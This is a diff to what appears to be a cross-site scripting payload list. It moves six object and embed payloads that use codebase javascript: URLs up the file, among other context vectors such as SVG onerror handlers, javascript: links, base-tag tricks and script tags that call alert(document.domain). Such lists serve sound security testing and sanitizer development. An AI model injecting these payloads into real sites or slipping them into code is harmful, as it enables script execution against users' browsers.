@@ -38,6 +38,12 @@
 <svg><use href=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" />
 <a href=\"javascript://%0aalert(1)\">XSS</a>
 <base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>
+<object data=# codebase=javascript:alert(document.domain)//>
+<embed src=# codebase=javascript:alert(document.domain)//>
+<object data=\"#\nalert(1)\" codebase=javascript://>
+<object data=\"#!\nalert(1)\" codebase=javascript:>
+<embed src=\"#\nalert(1)\" codebase=javascript://>
+<embed src=\"#!\nalert(1)\" codebase=javascript:>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -1046,12 +1052,6 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
 <script>navigation.navigate('javascript:alert(1)')</script>
-<object data=# codebase=javascript:alert(document.domain)//>
-<embed src=# codebase=javascript:alert(document.domain)//>
-<object data=\"#\nalert(1)\" codebase=javascript://>
-<object data=\"#!\nalert(1)\" codebase=javascript:>
-<embed src=\"#\nalert(1)\" codebase=javascript://>
-<embed src=\"#!\nalert(1)\" codebase=javascript:>
 <script>onerror=alert;throw 1</script>
 <script>{onerror=alert}throw 1</script>
 <script>throw onerror=alert,1</script>
